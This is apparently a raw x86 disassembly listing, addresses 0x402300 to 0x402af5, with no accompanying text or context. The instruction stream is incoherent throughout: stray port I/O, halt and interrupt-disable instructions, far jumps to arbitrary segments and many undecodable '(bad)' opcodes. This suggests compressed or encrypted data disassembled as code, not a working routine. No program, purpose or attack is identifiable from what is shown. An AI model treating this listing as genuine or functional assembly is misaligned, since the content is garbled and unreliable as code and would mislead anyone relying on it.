  402300:	out    dx,eax
  402301:	pop    eax
  402302:	adc    DWORD PTR [ecx],esi
  402304:	arpl   WORD PTR [ecx-0x78],sp
  402307:	xor    DWORD PTR [edx+0x5e],ebx
  40230a:	inc    edx
  40230b:	xor    ebp,DWORD PTR [esi]
  40230d:	pop    es
  40230e:	push   es
  40230f:	add    al,0xe4
  402311:	clc    
  402312:	aas    
  402313:	sub    BYTE PTR [esi-0xe4d8b75],0x68
  40231a:	dec    esp
  40231b:	mov    ch,BYTE PTR [edx]
  40231d:	xor    DWORD PTR ds:0x1347c1da,0x836e783b
  402327:	mov    DWORD PTR [bx+si-0x25],eax
  40232b:	add    dl,BYTE PTR [ebx+0x5f]
  40232e:	push   edx
  40232f:	mov    dh,0x2b
  402331:	cwde   
  402332:	push   0x74
  402334:	dec    ecx
  402335:	dec    ecx
  402336:	mov    bl,0x3b
  402338:	call   0x6ceee94f
  40233d:	xchg   esp,eax
  40233e:	push   ebx
  40233f:	pop    ds
  402340:	dec    ebp
  402341:	jmp    DWORD PTR [edi+0x4e]
  402344:	int3   
  402345:	aaa    
  402346:	adc    eax,0x1f76ebb3
  40234b:	not    BYTE PTR [ecx]
  40234d:	es repz mov esi,0xdfa65289
  402354:	add    BYTE PTR [esi],dh
  402356:	add    eax,0x5504e9c3
  40235b:	fucomip st,st(7)
  40235d:	out    dx,eax
  40235e:	shl    BYTE PTR [edi],0xba
  402361:	das    
  402362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402363:	cmc    
  402364:	out    dx,al
  402365:	pop    edx
  402366:	adc    cl,cl
  402368:	add    ecx,ebx
  40236a:	je     0x4022fd
  40236c:	ret    0x4737
  40236f:	or     eax,0x206ed93d
  402374:	cmp    al,0x94
  402376:	movd   mm2,DWORD PTR [ecx+0x78]
  40237a:	fld    DWORD PTR [ebx-0x2c]
  40237d:	outs   dx,BYTE PTR ds:[esi]
  40237e:	ja     0x40236e
  402380:	mov    eax,ds:0x8d7747a8
  402385:	frstor [edi]
  402387:	out    dx,al
  402388:	jno    0x402317
  40238a:	pop    ecx
  40238b:	or     DWORD PTR [edi-0x3494bd5a],0x73
  402392:	adc    al,BYTE PTR ds:0xbb36dc4f
  402398:	lahf   
  402399:	out    dx,al
  40239a:	add    ebp,DWORD PTR [esi]
  40239c:	rcl    DWORD PTR [eax],1
  40239e:	sub    eax,0x9441fc76
  4023a3:	fldenv [ebx+0x20bbe1f4]
  4023a9:	cs cmc 
  4023ab:	dec    ebx
  4023ac:	inc    esi
  4023ad:	bound  ebx,QWORD PTR [ebp+0x136feeb2]
  4023b3:	mov    ah,0xea
  4023b5:	inc    edx
  4023b6:	inc    edx
  4023b7:	xor    dh,BYTE PTR [edi]
  4023b9:	pop    ebx
  4023ba:	inc    edx
  4023bb:	in     eax,0xba
  4023bd:	scas   al,BYTE PTR es:[edi]
  4023be:	call   0xb75b2ced
  4023c3:	and    ah,BYTE PTR [edx]
  4023c5:	test   edi,esp
  4023c7:	jl     0x4023aa
  4023c9:	add    BYTE PTR [esi+0x7b83d083],bl
  4023cf:	js     0x40240e
  4023d1:	mov    BYTE PTR [edi+0xe4221b1],cl
  4023d7:	mov    DWORD PTR [edx+0x54fcfdf4],esi
  4023dd:	loopne 0x4023ef
  4023df:	inc    edx
  4023e0:	jne    0x4023c0
  4023e2:	xlat   BYTE PTR ds:[ebx]
  4023e3:	mov    ecx,edi
  4023e5:	xor    BYTE PTR [ebx],0xb1
  4023e8:	out    dx,al
  4023e9:	rcr    BYTE PTR [eax+0x3d],cl
  4023ec:	dec    ebx
  4023ed:	or     ebx,eax
  4023ef:	out    dx,eax
  4023f0:	adc    eax,0xa9f89bdf
  4023f5:	cmp    al,0xdb
  4023f7:	jmp    0x6957:0x363f64cb
  4023fe:	cmp    edx,esp
  402400:	dec    eax
  402401:	int    0xe5
  402403:	dec    esi
  402404:	xor    bl,BYTE PTR [esp+ebp*4-0x14]
  402408:	sub    DWORD PTR [edi+0x4058bc2a],0x9e66fbb9
  402412:	cmc    
  402413:	mov    ch,0xa6
  402415:	test   al,0x6a
  402417:	scas   eax,DWORD PTR es:[edi]
  402418:	les    esi,FWORD PTR [esi+edx*2]
  40241b:	dec    ecx
  40241c:	hlt    
  40241d:	mov    ecx,0x57ea119e
  402422:	xchg   ecx,eax
  402423:	rcl    BYTE PTR [esi],0x62
  402426:	(bad)  
  402427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402428:	push   edi
  402429:	inc    edx
  40242a:	lock push edi
  40242c:	dec    edx
  40242d:	mov    al,ds:0x967e1707
  402432:	imul   esi,ecx,0xf80a4d26
  402438:	(bad)  
  402439:	push   0xe0f8d28f
  40243e:	mov    eax,0x97ad4a29
  402443:	(bad)  
  402444:	fist   WORD PTR [edi+eax*1]
  402447:	push   0xffffffa4
  402449:	jno    0x40247a
  40244b:	std    
  40244c:	cli    
  40244d:	and    eax,ebx
  40244f:	(bad)  
  402450:	cmp    DWORD PTR [esi-0x65],ebx
  402453:	pop    es
  402454:	mov    dh,0xe8
  402456:	pop    edx
  402457:	stos   DWORD PTR es:[edi],eax
  402458:	test   ebx,esp
  40245a:	jns    0x4023e0
  40245c:	fs sbb eax,0x395e1354
  402462:	pop    es
  402463:	mov    esi,0xa58d5ea8
  402468:	adc    BYTE PTR [edi],dl
  40246a:	cmp    al,0x22
  40246c:	and    dl,dh
  40246e:	and    al,0x82
  402470:	or     bl,dl
  402472:	loop   0x402461
  402474:	mov    ds:0xe1a5ad72,eax
  402479:	popa   
  40247a:	jb     0x40247f
  40247c:	ror    DWORD PTR [ebp+0x54de124d],0xa5
  402483:	xchg   BYTE PTR [ebx+ecx*2],cl
  402486:	daa    
  402487:	push   edi
  402488:	pop    edi
  402489:	lods   al,BYTE PTR ds:[esi]
  40248a:	test   BYTE PTR [edi+ebp*1],bh
  40248d:	ds mov edi,0x8b8fb0a5
  402493:	xor    esp,DWORD PTR ds:0xb1761ef8
  402499:	inc    ecx
  40249a:	(bad)  
  40249b:	push   cs
  40249c:	sub    ch,BYTE PTR [esi+0x7c]
  40249f:	push   0xffffffcf
  4024a1:	mov    gs,WORD PTR [ebp+0x62d7010e]
  4024a7:	sub    edx,esi
  4024a9:	jae    0x4024e9
  4024ab:	dec    ecx
  4024ac:	sub    eax,0x3cc6d7ad
  4024b1:	sub    eax,0xda46d454
  4024b6:	into   
  4024b7:	cmp    al,0x56
  4024b9:	retf   0xd056
  4024bc:	scas   eax,DWORD PTR es:[edi]
  4024bd:	add    dl,cl
  4024bf:	es clc 
  4024c1:	dec    ecx
  4024c2:	cmp    edx,eax
  4024c4:	ja     0x402456
  4024c6:	ret    
  4024c7:	lods   al,BYTE PTR ds:[esi]
  4024c8:	mov    edi,ebp
  4024ca:	pop    ebp
  4024cb:	inc    esi
  4024cc:	sbb    DWORD PTR [ebp-0x550c9e48],esp
  4024d2:	xchg   DWORD PTR [ecx],ebp
  4024d4:	cli    
  4024d5:	(bad)
  4024d8:	pop    ecx
  4024d9:	jbe    0x402490
  4024db:	ffreep st(3)
  4024dd:	rcr    BYTE PTR [edi],cl
  4024df:	aam    0xa7
  4024e1:	mov    bl,0xd8
  4024e3:	cmc    
  4024e4:	adc    dl,BYTE PTR [edi]
  4024e6:	(bad)  
  4024e7:	jmp    0x9ed7:0x7946bb88
  4024ee:	sbb    BYTE PTR [ebx-0x2c],dh
  4024f1:	add    ah,BYTE PTR [eax-0x2303d77a]
  4024f7:	retf   0x6565
  4024fa:	adc    DWORD PTR [edi-0x59],eax
  4024fd:	jmp    0x957b415a
  402502:	jecxz  0x402562
  402504:	push   ds
  402505:	xchg   edx,eax
  402506:	icebp  
  402507:	add    BYTE PTR [esi],dh
  402509:	pusha  
  40250a:	push   ebx
  40250b:	pop    es
  40250c:	fst    QWORD PTR [ebp+0x6d]
  40250f:	fcom   DWORD PTR [ebx-0x12]
  402512:	mov    ah,0x5
  402514:	(bad)  
  402515:	or     ch,BYTE PTR [ecx]
  402517:	mov    fs,eax
  402519:	inc    ecx
  40251a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40251b:	sbb    ebp,edi
  40251d:	or     eax,0xee35195b
  402522:	sbb    eax,0xe4cdb299
  402527:	aaa    
  402528:	dec    ecx
  402529:	and    edx,ecx
  40252b:	js     0x4024e8
  40252d:	mov    ds:0x5f77fb0b,al
  402532:	aaa    
  402533:	out    dx,eax
  402534:	xchg   ebp,eax
  402535:	add    al,0x3a
  402537:	nop
  402538:	ins    DWORD PTR es:[edi],dx
  402539:	mov    al,ds:0x2949cba7
  40253e:	push   0x63
  402540:	fadd   DWORD PTR [ebp-0x375dbd15]
  402546:	inc    ebx
  402547:	mov    dl,0xd
  402549:	fdivr  QWORD PTR [edi]
  40254b:	shr    BYTE PTR [ecx],cl
  40254d:	ficomp WORD PTR [ebx+0xf1fcf31]
  402553:	mov    dh,0xbb
  402555:	add    eax,0xd89b7807
  40255a:	or     edx,ecx
  40255c:	ret    
  40255d:	and    BYTE PTR [edi],dh
  40255f:	sub    al,0x35
  402561:	popf   
  402562:	sar    BYTE PTR [ebx-0x4d],cl
  402565:	sub    ebx,DWORD PTR [esp+esi*4]
  402568:	sub    edi,DWORD PTR [eax+0x54]
  40256b:	jg     0x402552
  40256d:	ins    BYTE PTR es:[edi],dx
  40256e:	mov    ebp,0xde3f06dc
  402573:	push   0xffffff99
  402575:	sahf   
  402576:	aaa    
  402577:	pop    ebx
  402578:	mov    ds:0x6e60d0e5,al
  40257d:	pusha  
  40257e:	jne    0x4025ef
  402580:	retf   0x24b8
  402583:	pop    es
  402584:	push   es
  402585:	out    0x98,eax
  402587:	and    esi,DWORD PTR [esp+edi*4]
  40258a:	xor    DWORD PTR [ebp-0x13],edi
  40258d:	pop    esp
  40258e:	stos   DWORD PTR es:[edi],eax
  40258f:	adc    ch,BYTE PTR [edi+0x3f27b2ef]
  402595:	mov    al,ds:0x1ad22451
  40259a:	pop    es
  40259b:	fld    DWORD PTR [edi-0x59]
  40259e:	int3   
  40259f:	sbb    eax,0x1454f744
  4025a4:	outs   dx,BYTE PTR ds:[esi]
  4025a5:	pop    ecx
  4025a6:	icebp  
  4025a7:	imul   ebx,DWORD PTR [esi],0x6d4e828c
  4025ad:	sbb    al,0xea
  4025af:	and    bh,BYTE PTR [ecx]
  4025b1:	sub    ecx,eax
  4025b3:	fild   WORD PTR es:[edx]
  4025b6:	test   BYTE PTR [esi+0x5ef70e35],ch
  4025bc:	(bad)
  4025c0:	cmc    
  4025c1:	std    
  4025c2:	sbb    BYTE PTR [edx+ecx*4+0xb],0xd6
  4025c7:	jp     0x40261a
  4025c9:	in     eax,dx
  4025ca:	popa   
  4025cb:	bound  ecx,QWORD PTR [esi+0x5c07705e]
  4025d1:	mov    dh,BYTE PTR [eax]
  4025d3:	aas    
  4025d4:	mov    cl,0x74
  4025d6:	sar    bh,cl
  4025d8:	sbb    al,0xde
  4025da:	sub    DWORD PTR [eax],0xfffffff8
  4025dd:	jmp    0x982bd563
  4025e2:	xchg   BYTE PTR [esi+ebp*4],dh
  4025e5:	stos   DWORD PTR es:[edi],eax
  4025e6:	add    dh,BYTE PTR [eax+0x769364b5]
  4025ec:	adc    esp,DWORD PTR [ebp+edi*4+0x38a841ae]
  4025f3:	sahf   
  4025f4:	jmp    0x4025ef
  4025f6:	stos   DWORD PTR es:[edi],eax
  4025f7:	sbb    eax,0x6ea598eb
  4025fc:	std    
  4025fd:	add    al,0x78
  4025ff:	sub    DWORD PTR [eax+0x61],eax
  402602:	sub    al,0x61
  402604:	xor    dh,bl
  402606:	or     al,0x66
  402608:	sar    BYTE PTR [edx],cl
  40260a:	ret    
  40260b:	f2xm1  
  40260d:	adc    DWORD PTR [ebx+edx*2-0x1],ebp
  402611:	push   cs
  402612:	cmc    
  402613:	lea    ecx,[edx+0x6f]
  402616:	jmp    0x4025b2
  402618:	mov    ch,0xb8
  40261a:	or     al,0x37
  40261c:	xlat   BYTE PTR ds:[ebx]
  40261d:	cs xor eax,ebx
  402620:	xchg   edi,eax
  402621:	push   ebx
  402622:	pop    ebx
  402623:	hlt    
  402624:	jg     0x402632
  402626:	adc    BYTE PTR [eax+0x72788d56],cl
  40262c:	and    BYTE PTR [ecx-0x6e],0x79
  402630:	lds    ebp,FWORD PTR [ebp+0x19]
  402633:	and    DWORD PTR [ebx],esp
  402635:	rol    DWORD PTR [edi-0x65edb123],cl
  40263b:	jne    0x402605
  40263d:	(bad)  
  402640:	mov    cl,0x71
  402642:	xor    bh,BYTE PTR [esi-0xe]
  402645:	dec    esi
  402646:	imul   ebx,eax,0xa75724e9
  40264c:	xchg   esi,eax
  40264d:	fsubp  st(7),st
  40264f:	and    BYTE PTR [eax],dl
  402651:	fisubr DWORD PTR [ecx+edi*2]
  402654:	in     eax,0xb1
  402656:	sbb    bl,bh
  402658:	pushf  
  402659:	xor    BYTE PTR [edi+ecx*4-0x5d060e0e],0x18
  402661:	or     ebp,DWORD PTR [eax]
  402663:	xchg   BYTE PTR [eax-0x559633ee],cl
  402669:	or     eax,0x11641557
  40266e:	ret    0x72b0
  402671:	jmp    0x6707:0x85a962de
  402678:	adc    BYTE PTR [bx+si-0x2bb],cl
  40267d:	in     eax,0x48
  40267f:	sub    ebp,DWORD PTR [edi]
  402681:	xor    al,0xbf
  402683:	ss push es
  402685:	sub    al,0x97
  402687:	iret   
  402688:	mov    ch,0x84
  40268a:	add    ebp,ecx
  40268c:	pop    es
  40268d:	inc    eax
  40268e:	pop    edi
  40268f:	lods   al,BYTE PTR ds:[esi]
  402690:	loop   0x402636
  402692:	or     BYTE PTR [edx],ah
  402694:	mov    esi,0xbf55b069
  402699:	mov    esp,0x4ee00ca5
  40269e:	add    eax,0x9dec5a4b
  4026a3:	mov    esi,DWORD PTR [edx-0x114b608f]
  4026a9:	cmp    eax,0x5d05755e
  4026ae:	sub    BYTE PTR ds:0x48a95a6,0xe0
  4026b5:	add    DWORD PTR [edx],edx
  4026b7:	jge    0x402709
  4026b9:	mov    ?,WORD PTR [ecx]
  4026bb:	add    BYTE PTR [ebp-0x7f],0xaf
  4026bf:	data16 mov dl,0x87
  4026c2:	jle    0x402687
  4026c4:	mov    ecx,0x526aaabb
  4026c9:	jae    0x40267e
  4026cb:	lods   eax,DWORD PTR ds:[esi]
  4026cc:	mov    DWORD PTR [esi-0x51],0xb9fd4b59
  4026d3:	sbb    DWORD PTR [edi],ebx
  4026d5:	dec    ebx
  4026d6:	adc    BYTE PTR [ecx-0x79],ch
  4026d9:	pop    esi
  4026da:	repnz xor bh,cl
  4026dd:	xchg   esp,eax
  4026de:	in     eax,0x76
  4026e0:	das    
  4026e1:	(bad)
  4026e5:	mov    ecx,0xb03312d9
  4026ea:	ficomp WORD PTR [ebx-0x73]
  4026ed:	popa   
  4026ee:	and    al,dl
  4026f0:	fisttp QWORD PTR [ebp+0x50]
  4026f3:	mov    ecx,0x6ddc7a02
  4026f8:	inc    esp
  4026f9:	into   
  4026fa:	xor    ecx,DWORD PTR [ebx+0x5f]
  4026fd:	lock dec edi
  4026ff:	xlat   BYTE PTR ds:[ebx]
  402700:	nop
  402701:	mov    esi,DWORD PTR [edi+0x12700a3d]
  402707:	ror    DWORD PTR [eax],0x79
  40270a:	out    0x3e,al
  40270c:	mov    edi,0x22ab9f02
  402711:	xchg   edx,eax
  402712:	or     ch,bh
  402714:	ins    BYTE PTR es:[edi],dx
  402715:	icebp  
  402716:	shl    DWORD PTR [eax-0x79dc024d],0x34
  40271d:	add    bl,bl
  40271f:	sub    BYTE PTR [eax+ebx*8+0x57509ab8],al
  402726:	cvtpi2ps xmm5,QWORD PTR [eax+eax*4+0x528c664e]
  40272e:	lods   eax,DWORD PTR ds:[esi]
  40272f:	mov    ecx,0xcbf9cf61
  402734:	call   0xd306:0xbba9cca6
  40273b:	test   al,0x68
  40273d:	or     edi,ebp
  40273f:	enter  0xf0ea,0x79
  402743:	or     DWORD PTR [ecx+0x681ffef0],eax
  402749:	or     al,0xdd
  40274b:	adc    al,0x86
  40274d:	fs enter 0x21df,0xd8
  402752:	mov    al,ds:0x5ca493ba
  402757:	imul   esi,DWORD PTR [esi],0x1e
  40275a:	aaa    
  40275b:	cmp    eax,0xc546299e
  402760:	repz icebp 
  402762:	push   ebx
  402763:	lods   eax,DWORD PTR ds:[esi]
  402764:	stos   DWORD PTR es:[edi],eax
  402765:	fild   QWORD PTR [eax+0x31571e1]
  40276b:	jmp    0x5d03:0xb7a4f000
  402772:	fisub  DWORD PTR [esi]
  402774:	mov    ah,BYTE PTR [esi-0x52]
  402777:	jmp    0x40274e
  402779:	xor    eax,0x8dde82c7
  40277e:	sub    eax,0x89624667
  402783:	sub    eax,0x4beda5ed
  402788:	or     al,0x92
  40278a:	mov    edx,0x44e6ccf8
  40278f:	fisub  WORD PTR [ebx+ecx*8-0x1f]
  402793:	or     al,0xfe
  402795:	adc    eax,0x628f2f72
  40279a:	pop    es
  40279b:	icebp  
  40279c:	add    BYTE PTR ds:0x9a5b4c44,ch
  4027a2:	mov    edx,0x9989a5a4
  4027a7:	push   0x46d61b02
  4027ac:	fisttp WORD PTR [esi]
  4027ae:	mov    esp,0x4992d511
  4027b3:	add    BYTE PTR [esi],dl
  4027b5:	mov    ch,0xc3
  4027b7:	xchg   ebx,eax
  4027b8:	pop    esp
  4027b9:	mov    eax,0x2afc905b
  4027be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027bf:	adc    BYTE PTR [ecx+0xa],ah
  4027c2:	push   0xd848d3ad
  4027c7:	addr16 push esi
  4027c9:	mov    WORD PTR [ecx-0x6c],?
  4027cc:	hlt    
  4027cd:	cmc    
  4027ce:	cmp    BYTE PTR [eax],al
  4027d0:	test   DWORD PTR [ebx+0x5e],esi
  4027d3:	(bad)  
  4027d4:	es loope 0x402803
  4027d7:	daa    
  4027d8:	ror    BYTE PTR [esi],0x9b
  4027db:	jmp    0x402776
  4027dd:	jne    0x402836
  4027df:	cld    
  4027e0:	aam    0x33
  4027e2:	mov    edi,DWORD PTR [edi]
  4027e4:	dec    ebp
  4027e5:	leave  
  4027e6:	push   eax
  4027e7:	fiadd  WORD PTR [ebx-0x2c4fc1b4]
  4027ee:	pop    ebp
  4027ef:	(bad)  
  4027f0:	pop    ds
  4027f1:	cs lock mov dl,0x22
  4027f5:	out    dx,eax
  4027f6:	jge    0x4027ce
  4027f8:	jne    0x40278b
  4027fa:	sbb    BYTE PTR [edx],0xa8
  4027fd:	ins    DWORD PTR es:[edi],dx
  4027fe:	out    0x72,eax
  402800:	mov    esp,gs
  402802:	cdq    
  402803:	sbb    eax,0x17b153c2
  402808:	mov    edx,0xde47cd3c
  40280d:	les    esi,FWORD PTR [ecx]
  40280f:	jge    0x402855
  402811:	inc    esi
  402812:	xchg   edi,eax
  402813:	push   edx
  402814:	stos   DWORD PTR es:[edi],eax
  402815:	arpl   WORD PTR [ebx+0x7],si
  402818:	push   0x745413f4
  40281d:	mov    ecx,0x8f6dca22
  402822:	add    DWORD PTR [ebp-0x7e6f7da9],0x23
  402829:	or     al,0x84
  40282b:	fcomp  QWORD PTR [esi-0x55]
  40282e:	stos   BYTE PTR es:[edi],al
  40282f:	stos   BYTE PTR es:[edi],al
  402830:	in     eax,dx
  402831:	xor    eax,0xa32a497
  402836:	xor    ecx,edi
  402838:	pop    es
  402839:	jo     0x4027cd
  40283b:	int    0xee
  40283d:	mov    ebx,0x112c6da
  402842:	push   ds
  402843:	fstp   QWORD PTR [ecx-0x80]
  402846:	cmp    eax,0x9e9ebbe3
  40284b:	int    0xc4
  40284d:	push   ds
  40284e:	inc    esp
  40284f:	ins    DWORD PTR es:[edi],dx
  402850:	sbb    DWORD PTR [edx-0x6ef8f1ec],0xffffffe7
  402857:	addr16 pusha 
  402859:	or     bl,al
  40285b:	mov    DWORD PTR [ecx+0xa],edx
  40285e:	cs cmp al,0x93
  402861:	sahf   
  402862:	jbe    0x40283b
  402864:	lds    edi,FWORD PTR [edx]
  402866:	jl     0x4028ca
  402868:	jae    0x40288f
  40286a:	into   
  40286b:	in     eax,0xa7
  40286d:	ficom  WORD PTR [ecx]
  40286f:	fistp  DWORD PTR [edx-0x7d12bac7]
  402875:	std    
  402876:	add    BYTE PTR [ebp+edx*2+0x4a46f4e0],0xfc
  40287e:	ds hlt 
  402880:	enter  0x26f9,0x23
  402884:	in     al,0xf0
  402886:	stos   BYTE PTR es:[edi],al
  402887:	in     al,dx
  402888:	sbb    dl,ch
  40288a:	stos   BYTE PTR es:[edi],al
  40288b:	sub    edi,DWORD PTR [ecx+0x1e12d6ce]
  402891:	lds    esp,FWORD PTR ds:0xccc0f754
  402897:	pop    ds
  402898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402899:	jnp    0x40283a
  40289b:	leave  
  40289c:	mov    ebx,0xc0bb39d1
  4028a1:	xchg   esp,eax
  4028a2:	in     eax,dx
  4028a3:	mov    ds:0xd776113b,eax
  4028a8:	push   ss
  4028a9:	cmp    eax,0xe7075ca4
  4028ae:	add    eax,0xfdb94225
  4028b3:	mov    ds:0x21b1651,al
  4028b8:	jmp    0xbe4a239
  4028bd:	not    BYTE PTR ds:0xf97510bf
  4028c3:	bound  ecx,QWORD PTR [esi+0x68]
  4028c6:	imul   DWORD PTR ds:0xcd488b3
  4028cc:	jle    0x40285f
  4028ce:	std    
  4028cf:	mov    esi,0x5f63a178
  4028d4:	and    DWORD PTR [edx],edx
  4028d6:	leave  
  4028d7:	mov    esi,ebp
  4028d9:	adc    bh,BYTE PTR [edx]
  4028db:	popf   
  4028dc:	stc    
  4028dd:	fbld   TBYTE PTR [ecx+0x6df18c8]
  4028e3:	xchg   eax,ebx
  4028e5:	outs   dx,BYTE PTR ds:[esi]
  4028e6:	sbb    eax,DWORD PTR [ebx-0x4d]
  4028e9:	inc    esi
  4028ea:	test   DWORD PTR [ebx],0x60b7452
  4028f0:	call   0xcdd7:0xcbf761e0
  4028f7:	or     eax,0x361d6976
  4028fc:	jle    0x4028f3
  4028fe:	leave  
  4028ff:	and    al,0x89
  402901:	shr    DWORD PTR [edi-0x52],0xe9
  402905:	dec    edi
  402907:	mov    ds:0xefeb487d,al
  40290c:	inc    esp
  40290d:	dec    edx
  40290e:	outs   dx,DWORD PTR ds:[esi]
  40290f:	cmp    dl,cl
  402911:	popa   
  402912:	stos   DWORD PTR es:[edi],eax
  402913:	and    edi,DWORD PTR [edx]
  402915:	imul   eax,DWORD PTR [edx+0x68586504],0x9d3b8b40
  40291f:	push   es
  402920:	cmp    DWORD PTR [edi-0x14876f85],ebx
  402926:	shld   DWORD PTR [ebp-0x25],esp,0x58
  40292b:	cwde   
  40292c:	pop    ds
  40292d:	test   DWORD PTR [eax-0x1c155f71],edx
  402933:	loop   0x402943
  402935:	add    ah,BYTE PTR [edi+0x2b]
  402938:	fadd   QWORD PTR [ebx]
  40293a:	out    0xce,al
  40293c:	jmp    0x78ce48c7
  402941:	push   es
  402942:	push   cs
  402943:	js     0x4028f5
  402945:	jg     0x40297a
  402947:	or     ecx,DWORD PTR [eax-0x58]
  40294a:	and    ecx,esp
  40294c:	scas   al,BYTE PTR es:[edi]
  40294d:	mov    eax,0xc340fba0
  402952:	or     DWORD PTR [eax],0xffffffff
  402955:	rcl    ecx,0xe2
  402958:	cmp    bl,BYTE PTR [ecx]
  40295a:	(bad)  
  40295b:	mov    ds:0xd26a8525,al
  402960:	fsubr  DWORD PTR [esi]
  402962:	(bad)  
  402964:	push   ebx
  402965:	imul   esi,DWORD PTR [ebx],0xffffffdd
  402968:	test   BYTE PTR [edi-0x1a],0x8c
  40296c:	jecxz  0x402923
  40296e:	aas    
  40296f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402970:	repnz push esp
  402972:	sbb    BYTE PTR [eax-0x5f],bl
  402975:	sar    DWORD PTR [ebx-0xa8079b4],cl
  40297b:	cdq    
  40297c:	dec    esp
  40297d:	push   ebp
  40297e:	dec    ecx
  40297f:	popf   
  402980:	enter  0x1d6a,0xbe
  402984:	xor    eax,0xc64c0fbd
  402989:	or     DWORD PTR [esi],0xef51b5af
  40298f:	or     al,0x35
  402991:	pop    esi
  402992:	mov    edx,DWORD PTR [eax-0x54]
  402995:	retf   
  402996:	pop    ecx
  402997:	test   al,0x37
  402999:	push   edx
  40299a:	jne    0x4029d2
  40299c:	inc    ebp
  40299d:	mov    ah,0x1e
  40299f:	adc    BYTE PTR [eax],bl
  4029a1:	daa    
  4029a2:	je     0x4029a5
  4029a4:	mov    esi,0x63b681a7
  4029a9:	push   ebx
  4029aa:	sbb    DWORD PTR [edx+0xa7a182d],eax
  4029b0:	dec    ebx
  4029b1:	mov    edx,0x315f6f3d
  4029b6:	imul   edi,edx,0x866c1262
  4029bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029bd:	je     0x40297f
  4029bf:	pop    ebp
  4029c0:	cmp    eax,0xe8c7edf3
  4029c5:	shl    al,1
  4029c7:	sbb    al,0xee
  4029c9:	fisttp DWORD PTR [esi-0x4d]
  4029cc:	jg     0x4029e6
  4029ce:	cmp    al,al
  4029d0:	int3   
  4029d1:	push   ebp
  4029d2:	call   0xbccb:0x4c884598
  4029d9:	push   eax
  4029da:	fisub  DWORD PTR gs:[ebx-0x24]
  4029de:	loop   0x40296e
  4029e0:	dec    esp
  4029e1:	inc    ecx
  4029e2:	mov    al,ds:0x4e88d127
  4029e7:	imul   BYTE PTR [ebp-0x77e31e3e]
  4029ed:	jno    0x4029a6
  4029ef:	lea    ecx,[ecx-0x906d4d3]
  4029f5:	pop    eax
  4029f6:	cmpxchg eax,ebx
  4029f9:	adc    eax,0x6177b667
  4029fe:	or     al,0x64
  402a00:	arpl   WORD PTR [ecx-0x40b8de0f],si
  402a06:	pop    edi
  402a07:	aam    0x3d
  402a09:	in     eax,0x3b
  402a0b:	xor    ah,ch
  402a0d:	out    0x8b,al
  402a0f:	adc    DWORD PTR [edi-0x28],0xffffffbe
  402a13:	and    eax,0xc6f331a5
  402a18:	(bad)  
  402a19:	push   ebx
  402a1a:	jae    0x4029b6
  402a1c:	xor    eax,0x405929d0
  402a21:	ret    0x1857
  402a24:	xchg   ebp,eax
  402a25:	xchg   esi,eax
  402a26:	je     0x4029cc
  402a28:	(bad)  
  402a2a:	in     eax,0x5
  402a2c:	xchg   BYTE PTR [ecx+edi*1-0x7aea7148],bl
  402a33:	xchg   esp,eax
  402a34:	cdq    
  402a35:	dec    esp
  402a36:	out    dx,al
  402a37:	jne    0x402a99
  402a39:	ret    0xb5a8
  402a3c:	jne    0x402a24
  402a3e:	xor    al,0x46
  402a40:	mov    WORD PTR [esi+0xb],ss
  402a43:	pop    ebp
  402a44:	push   ecx
  402a45:	shr    al,0x30
  402a48:	pusha  
  402a49:	loopne 0x402a5a
  402a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a4d:	sub    eax,0x736031b
  402a52:	cld    
  402a53:	sbb    eax,0x332a3f45
  402a58:	sbb    edi,DWORD PTR [ebx+0x36]
  402a5b:	add    eax,0xbaba4006
  402a60:	sbb    al,0x34
  402a62:	sar    BYTE PTR [ebx],1
  402a64:	sbb    edx,DWORD PTR [ebx+0x591af0d0]
  402a6a:	fist   WORD PTR [esi]
  402a6c:	stc    
  402a6d:	push   ebp
  402a6e:	jl     0x402a5c
  402a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a71:	jbe    0x402a0b
  402a73:	dec    edx
  402a74:	in     al,dx
  402a75:	(bad)  
  402a77:	adc    al,0xd8
  402a79:	add    al,0x4d
  402a7b:	add    BYTE PTR [edx+0x22f06d19],0x4f
  402a82:	ds mov esi,0xd59e420d
  402a88:	icebp  
  402a89:	aas    
  402a8a:	adc    BYTE PTR [ebp+0x21f97c33],al
  402a90:	jecxz  0x402b02
  402a92:	aas    
  402a93:	mov    cl,0xc
  402a95:	imul   ebx,DWORD PTR [ebp-0x66],0x23
  402a99:	xor    eax,0x56e658f4
  402a9e:	mov    cl,BYTE PTR [edx-0xba35a42]
  402aa4:	(bad)  
  402aa6:	hlt    
  402aa7:	scas   al,BYTE PTR es:[edi]
  402aa8:	cmp    al,0xc2
  402aaa:	dec    edi
  402aab:	and    esi,DWORD PTR [eax]
  402aad:	jne    0x402a4b
  402aaf:	jmp    0x3fa6d618
  402ab4:	cmp    cl,al
  402ab6:	mov    ch,0xfd
  402ab8:	daa    
  402ab9:	js     0x402b30
  402abb:	retf   0x9999
  402abe:	out    dx,eax
  402abf:	mov    esp,0x3ac465fd
  402ac4:	lods   al,BYTE PTR ds:[esi]
  402ac5:	pop    esp
  402ac6:	hlt    
  402ac7:	adc    al,0xc0
  402ac9:	sahf   
  402aca:	cli    
  402acb:	pop    esp
  402acc:	fisub  DWORD PTR [edx]
  402ace:	or     al,0xfa
  402ad0:	and    ebp,esp
  402ad2:	jp     0x402adc
  402ad4:	push   ds
  402ad5:	pop    esp
  402ad6:	adc    cl,BYTE PTR [ebx]
  402ad8:	fmul   st,st(0)
  402ada:	mov    al,ds:0xf87a5f19
  402adf:	stos   DWORD PTR es:[edi],eax
  402ae0:	cmp    BYTE PTR [edi+0x38],bh
  402ae3:	cwde   
  402ae4:	psubusw mm2,mm3
  402ae7:	xor    ah,BYTE PTR [eax]
  402ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aea:	xchg   edx,edi
  402aec:	fidivr DWORD PTR [edi*2-0x6021a18d]
  402af3:	stos   DWORD PTR es:[edi],eax
  402af4:	inc    ebx
  402af5:	xchg   esp,eax
